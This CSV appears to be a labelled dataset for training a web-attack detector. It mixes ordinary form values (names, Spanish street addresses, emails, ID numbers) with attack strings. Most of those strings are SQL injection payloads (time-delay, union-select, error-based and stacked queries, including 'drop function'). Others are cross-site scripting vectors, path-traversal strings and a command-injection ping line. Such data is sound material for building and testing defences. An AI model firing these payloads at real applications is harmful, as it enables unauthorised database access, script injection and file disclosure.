payload,length,attack_type,label
1') rlike (select * from (select(sleep(5)))sgvo) and ('cmqe' like 'cmqe,71,sqli,anom
1%'))) waitfor delay '0:0:5' and ((('%'=',41,sqli,anom
fickes,6,norm,norm
kipnis,6,norm,norm
"1',(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))",93,sqli,anom
1) union all select null--,26,sqli,anom
goertzen,8,norm,norm
9610160798994591,16,norm,norm
"1' where 3425=3425 and elt(4249=4249,7259)--",44,sqli,anom
4a39c44a,8,norm,norm
21468433a,9,norm,norm
reinazgo,8,norm,norm
"1' and elt(1210=1210,sleep(5)) and 'yhpp' like 'yhpp",52,sqli,anom
"calle isis, 180",15,norm,norm
holbrook,8,norm,norm
6832377240698401,16,norm,norm
valenti grans,13,norm,norm
"1"") where 3084=3084 union all select null,null--",48,sqli,anom
paone,5,norm,norm
scorziel,8,norm,norm
nogueruelas,11,norm,norm
19310,5,norm,norm
samanta,7,norm,norm
39527,5,norm,norm
"doctor ramon sanchez-parra, 17 11?d",35,norm,norm
3658503055705186,16,norm,norm
"-5207"" where 2050=2050 union all select 2050,2050,2050,2050,2050,2050,2050--",76,sqli,anom
"-7511)) as xqzf where 9939=9939 union all select 9939,9939,9939,9939,9939,9939,9939--",85,sqli,anom
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'ytlf'='ytlf",108,sqli,anom
covachuela,10,norm,norm
6aq408tro,9,norm,norm
-4583') as evbo where 6055=6055 union all select 6055--,55,sqli,anom
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""oyfz""=""oyfz",124,sqli,anom
"1"") as nyzd where 5305=5305;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",128,sqli,anom
-1621' in boolean mode) order by 1--,36,sqli,anom
vaciar carrito,14,norm,norm
realmente,9,norm,norm
7340868794672217,16,norm,norm
ambiental,9,norm,norm
10860,5,norm,norm
rez,3,norm,norm
"caada de los ingleses, 117,",27,norm,norm
ermindo,7,norm,norm
91650654r,9,norm,norm
mascarino.marenghi@cocheacoche.lv,33,norm,norm
mohr,4,norm,norm
"1) union all select null,null,null,null,null,null,null,null#",60,sqli,anom
ozerea malibrn,14,norm,norm
bannister-griffel@youtubed.la,29,norm,norm
oestreic,8,norm,norm
95!6a752a,9,norm,norm
birgel_pusith@hojainformativas.com.nu,37,norm,norm
1'))) rlike sleep(5)#,21,sqli,anom
8222689869080007,16,norm,norm
-4057') order by 1#,19,sqli,anom
pelamen,7,norm,norm
"1 where 7932=7932 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",121,sqli,anom
"1%'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",82,sqli,anom
calle escalona s/n,18,norm,norm
"-3282') union all select 9002,9002,9002,9002,9002#",50,sqli,anom
"rua bamio, 190 11?h",19,norm,norm
pusit@marketingmunicipal.ro,27,norm,norm
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('tkcy' like 'tkcy",129,sqli,anom
rossenberck,11,norm,norm
"1"") where 7588=7588 waitfor delay '0:0:5'--",43,sqli,anom
1;if(5127=2829) select 5127 else drop function okos--,53,sqli,anom
chungjen,8,norm,norm
valdelagua del cerro,20,norm,norm
/./.././.././../{file},22,path-traversal,anom
11140,5,norm,norm
"1"") where 9461=9461 union all select null,null,null,null,null,null,null,null,null#",82,sqli,anom
"-9577'||(select 'vloa' from dual where 7184=7184 union all select 7184,7184#",76,sqli,anom
sagarda,7,norm,norm
1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,59,sqli,anom
33s4h9929r,10,norm,norm
"1"")) as yosd where 1255=1255;begin user_lock.sleep(5); end--",60,sqli,anom
"""</comment><img src=x onerror=alert(1)//"">",42,xss,anom
"1) as qjbd where 2808=2808 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",215,sqli,anom
donaldo,7,norm,norm
1';begin dbms_lock.sleep(5); end and 'icny' like 'icny,54,sqli,anom
"c/ la pinta, 158 9?d",20,norm,norm
"1"")) as wwqj where 3249=3249 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",136,sqli,anom
08518,5,norm,norm
uribitarte 72 13?g,18,norm,norm
hrenyk,6,norm,norm
8352,4,norm,norm
29385081m,9,norm,norm
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""gimc"" like ""gimc",130,sqli,anom
chodos/xodos,12,norm,norm
duchement tenza,15,norm,norm
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",96,sqli,anom
"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",93,sqli,anom
merrywea,8,norm,norm
"1') and elt(3114=3114,sleep(5))#",32,sqli,anom
roseman-hensley@fighting-machines.wf,36,norm,norm
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('svhx'='svhx,202,sqli,anom
"1')) as sxpk where 5524=5524 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",232,sqli,anom
1'||(select 'vdeo' where 4355=4355;(select * from (select(sleep(5)))acdk)#,74,sqli,anom
shanir,6,norm,norm
abarraganamiento,16,norm,norm
"c/ ulises 17,",13,norm,norm
savitsky@tetdevelocidad.sj,26,norm,norm
spruance@maquillajeparalabios.ro,32,norm,norm
barsky,6,norm,norm
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'hvqt'='hvqt",101,sqli,anom
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('qfls'='qfls",116,sqli,anom
t6r551ero,9,norm,norm
"1'||(select 'boib' where 9595=9595;select benchmark(5000000,md5(0x714e4153))#",77,sqli,anom
alyce,5,norm,norm
bouchot betancur,16,norm,norm
"1'))) and make_set(8403=8403,8899) and ((('oacz'='oacz",54,sqli,anom
bette-an,8,norm,norm
">""<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",246,xss,anom
"1') and 3824=benchmark(5000000,md5(0x76555642))",47,sqli,anom
humphrie,8,norm,norm
rafaela,7,norm,norm
"1"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",90,sqli,anom
1%';if(7899=7899) select 7899 else drop function zbbp--,55,sqli,anom
62745700k,9,norm,norm
"-1263"") or 9323=9323#",21,sqli,anom
"1,(select (case when (7616=7616) then 1 else 1/(select 0) end))",63,sqli,anom
& ping -i 30 127.0.0.1 &,24,cmdi,anom
rahue,5,norm,norm
soeltoft@nanogenerador.pr,25,norm,norm
"-6639') as trll where 6271=6271 union all select 6271,6271,6271#",64,sqli,anom
malleson_varney@tomorrow.com.cz,31,norm,norm
34305,5,norm,norm
"1) and make_set(1559=4863,4863)",31,sqli,anom
"-7006' where 6966=6966 union all select 6966,6966,6966,6966#",60,sqli,anom
castiglioni@hiperbilbao.nl,26,norm,norm
97573176t,9,norm,norm
moffatt@icodea.mq,17,norm,norm
giribet armisn,14,norm,norm
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../../{file},288,path-traversal,anom
roedel,6,norm,norm
phelpr@eonon.com.pr,19,norm,norm
escaler astorquiza,18,norm,norm
antoliano,9,norm,norm
"1%'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='",120,sqli,anom
5711670970472426,16,norm,norm
cubillos del sil,16,norm,norm
"-4828'+(select qxnw where 9488=9488 union all select 9488,9488--",64,sqli,anom
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'ozur'='ozur",93,sqli,anom
36357,5,norm,norm
1')) or (select * from (select(sleep(5)))ydpu) and (('ckmm' like 'ckmm,70,sqli,anom
tasies cirujano,15,norm,norm
sant llus,9,norm,norm
gunner@piaceredelivery.kw,25,norm,norm
scala@novisa.ch,15,norm,norm
orr,3,norm,norm
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""azzv"" like ""azzv",66,sqli,anom
quintana redonda,16,norm,norm
goring@quadernideilgarda.pl,27,norm,norm
i2cit6d4r,9,norm,norm
"-2216"") where 6692=6692 union all select 6692,6692,6692#",56,sqli,anom
02210042h,9,norm,norm
depredador,10,norm,norm
"-5755"" or 3581=7566",19,sqli,anom
"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",220,sqli,anom
calle estafeta 105 6c,21,norm,norm
2895,4,norm,norm
9521659963163883,16,norm,norm
ribera del fresno,17,norm,norm
"-2254') as dyrv where 9079=9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",89,sqli,anom
"1' in boolean mode) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,sqli,anom
murad@magadan.org.pe,20,norm,norm
presbiteriano,13,norm,norm
1)) or sleep(5) and ((8285=8285,31,sqli,anom
"1) as pyjx where 9005=9005;select benchmark(5000000,md5(0x714e4153))#",69,sqli,anom
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),205,sqli,anom
8158378459741170,16,norm,norm
7466876651335348,16,norm,norm
5561938510666442,16,norm,norm
calle ulises s/n 11d,20,norm,norm
34336341d,9,norm,norm
harrold_elloy@santacruzdelvoto.ci,33,norm,norm
filen?a,7,norm,norm
-8099%')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',223,sqli,anom
"1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#",86,sqli,anom
17867,5,norm,norm
"1"") as vpna where 5450=5450 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",165,sqli,anom
-7770' where 6503=6503 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,204,sqli,anom
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# cykf,194,sqli,anom
cijuela,7,norm,norm
1' where 1557=1557;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,112,sqli,anom
"-7812') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ttvo'='ttvo",220,sqli,anom
"1%"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""%""=""",107,sqli,anom
aceituna,8,norm,norm
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../{file},276,path-traversal,anom
nirma,5,norm,norm
"1'||(select 'fbtm' where 1335=1335 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",141,sqli,anom
"1'||(select 'ezse' from dual where 3821=3821;select count(*) from generate_series(1,5000000)--",94,sqli,anom
1') or sleep(5) and ('fizk'='fizk,33,sqli,anom
jwahar,6,norm,norm
3,1,norm,norm
38249138t,9,norm,norm
"1 where 6044=6044 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",174,sqli,anom
maureen,7,norm,norm
43507844d,9,norm,norm
serna kovac,11,norm,norm
gonzale.katsuno@viajesparamujeres.tc,36,norm,norm
"1%')) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",113,sqli,anom
08281,5,norm,norm
57649963a,9,norm,norm
"1""))) union all select null,null,null,null,null,null,null,null--",64,sqli,anom
4urr3at9,8,norm,norm
"calle santa teresa, 87 5?b",26,norm,norm
82402810c,9,norm,norm
$amarulencia,12,norm,norm
-2569' union all select 4484--,30,sqli,anom
fraccionario,12,norm,norm
rooso,5,norm,norm
garciaz,7,norm,norm
simonne,7,norm,norm
vitalia,7,norm,norm
linton,6,norm,norm
16360,5,norm,norm
"1"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,sqli,anom
28505,5,norm,norm
lippman,7,norm,norm
1)) as svhd where 9761=9761;select case when 7717=7717 then 1 else null end--,77,sqli,anom
09107,5,norm,norm
"c/ las chumberas, 38,",21,norm,norm
"1 where 1886=1886 union all select null,null,null,null,null,null,null,null,null--",81,sqli,anom
1 where 3735=3735;waitfor delay '0:0:5'--,41,sqli,anom
"1')) and elt(3053=9778,9778) and (('yfaa' like 'yfaa",52,sqli,anom
1;waitfor delay '0:0:5'--,25,sqli,anom
2876,4,norm,norm
braden,6,norm,norm
14230,5,norm,norm
"-8053"" where 5458=5458 or 9323=9323#",36,sqli,anom
-6449')) or 2590=2848,21,sqli,anom
"(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",91,sqli,anom
9380,4,norm,norm
carnalmente,11,norm,norm
1%')) waitfor delay '0:0:5'--,29,sqli,anom
"1'+(select blbd where 7451=7451 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",204,sqli,anom
c/ doctor luis calandre 44,26,norm,norm
"1'+(select 'wkcq' where 1020=1020 and 2388=benchmark(5000000,md5(0x6d457153))#",78,sqli,anom
"1"" or sleep(5) and ""telb""=""telb",31,sqli,anom
1')));if(9431=6730) select 9431 else drop function xbkh--,57,sqli,anom
cervecera,9,norm,norm
jeffries,8,norm,norm
19361,5,norm,norm
"""><iframe src=a onload=alert(""vl"") <",36,xss,anom
-2936) or 6872=6872,19,sqli,anom
1524943090962502,16,norm,norm
-9893' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'pbop'='pbop,225,sqli,anom
b129a97r,8,norm,norm
vajih,5,norm,norm
gracindo@ajuntamentbcn2-0.jp,28,norm,norm
"1%')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'='",213,sqli,anom
/........................................................................../{file},82,path-traversal,anom
1)) as gxvp where 3865=3865;select (case when (8716=1338) then 1 else 8716*(select 8716 from master..sysdatabases) end)--,121,sqli,anom
almirall pahisa,15,norm,norm
winde,5,norm,norm
"1"") as sraw where 1997=1997 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",185,sqli,anom
donner.vai@barcafedaniss.wf,27,norm,norm
del,3,norm,norm
montamarta,10,norm,norm
pel3sg9,7,norm,norm
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",106,sqli,anom
pizcar,6,norm,norm
mattes,6,norm,norm
"1"");(select * from (select(sleep(5)))srmq) and (""avyw""=""avyw",60,sqli,anom
"1%"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",212,sqli,anom
corello6@eurograb.id,20,norm,norm
ajaraca,7,norm,norm
1750,4,norm,norm
"1"");begin user_lock.sleep(5); end and (""nuix"" like ""nuix",56,sqli,anom
7202990502846857,16,norm,norm
rode@sayuela.kw,15,norm,norm
"-2987"") as iyob where 7827=7827 or (8459=8459)*4906--",53,sqli,anom
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""squx"" like ""squx",127,sqli,anom
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('snoa'='snoa,119,sqli,anom
sinttico,8,norm,norm
";!--""<xss>=&{()}""",17,xss,anom
20629413t,9,norm,norm
7441005651932884,16,norm,norm
07342606v,9,norm,norm
"1"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""rfpq""=""rfpq",111,sqli,anom
1990568850978005,16,norm,norm
6121365584311454,16,norm,norm
"1"")) as nwnp where 6140=6140;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",113,sqli,anom
"1%' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",74,sqli,anom
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""piya""=""piya",202,sqli,anom
dermidio,8,norm,norm
-1876%') union all select 6463--,32,sqli,anom
44578051a,9,norm,norm
pullman-mcclintock@surcosur.st,30,norm,norm
m01rosa,7,norm,norm
perih1lio,9,norm,norm
1'+(select 'kicv' where 1976=1976 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))+',268,sqli,anom
"1 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",104,sqli,anom
guilmett,8,norm,norm
"plaza irineo gonzalez, s/n 13?f",31,norm,norm
"1"" where 9760=9760 or 4240=(select 4240 from pg_sleep(5))--",59,sqli,anom
39100,5,norm,norm
28730070b,9,norm,norm
intosh@corjet.cv,16,norm,norm
1'+(select 'xqjx' where 7048=7048 and 9198=9198--,49,sqli,anom
tnic1,5,norm,norm
2408203137238243,16,norm,norm
63545647m,9,norm,norm
"1))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8738=8738",115,sqli,anom
"1""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""ymhg""=""ymhg",226,sqli,anom
"1' and make_set(8403=8403,8899) and 'fttd' like 'fttd",53,sqli,anom
